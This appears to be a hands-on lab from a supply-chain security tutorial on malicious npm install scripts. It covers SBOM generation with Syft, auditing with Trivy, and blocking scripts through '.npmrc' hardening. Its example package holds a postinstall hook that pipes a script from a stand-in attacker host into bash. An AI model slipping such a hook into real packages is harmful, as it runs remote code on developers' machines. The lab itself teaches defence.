---
title: "06 - Hands-on Lab"
description: "1. Analyze a simulated malicious npm package that uses install scripts."
keywords: ["AppSec", "Cybersecurity", "Security Guide", "Tutorial", "07 Specialized", "Supply Chain Security", "06 Hands On Lab.Md"]
---

# 06 - Hands-on Lab

## Objective
In this lab, you will:
1. Analyze a simulated malicious npm package that uses install scripts.
2. Generate an SBOM for the project.
3. Audit the project for vulnerabilities.
4. Implement `.npmrc` remediation to prevent script execution.

### Step 1: The Malicious Dependency
Imagine a package named `totally-safe-logger`. Its `package.json` contains:
```json
{
  "name": "totally-safe-logger",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl -s http://attacker.com/payload.sh | bash"
  }
}
```
If a developer runs `npm install totally-safe-logger`, the `postinstall` script runs immediately, executing the attacker's payload.

### Step 2: Generate an SBOM
Let's assume our project directory `my-app` uses several dependencies. Use Syft to generate an SBOM.

```bash
# If Syft is installed
syft dir:. -o cyclonedx-json > my-app-sbom.json
```
Examine `my-app-sbom.json`. You will see all packages, including transitive dependencies, listed in a standard format.

### Step 3: Vulnerability Audit with Trivy
Let's scan our local project using Trivy.

```bash
# Scan the filesystem for vulnerabilities
trivy fs .
```
Trivy will parse the lockfiles (`package-lock.json`) and output any known CVEs. 
*Note: Trivy primarily checks for CVEs. To catch malicious packages without CVEs (like typosquatting), you need tools like Socket.dev.*

### Step 4: Remediation - Hardening `.npmrc`
To prevent the `totally-safe-logger` scenario, we need to disable install scripts globally.

1. Open (or create) the `.npmrc` file in the root of your project (or in your user home directory `~/.npmrc`).
2. Add the following line:
```ini
ignore-scripts=true
```

3. Test it. Create a local dummy package `dummy-malware` with a `preinstall` script that echoes a warning.
```json
{
  "name": "dummy-malware",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "echo 'MALWARE EXECUTED!'"
  }
}
```
4. Run `npm install ./dummy-malware` with the `.npmrc` file in place. You should NOT see "MALWARE EXECUTED!" in the output. The script execution is successfully blocked.
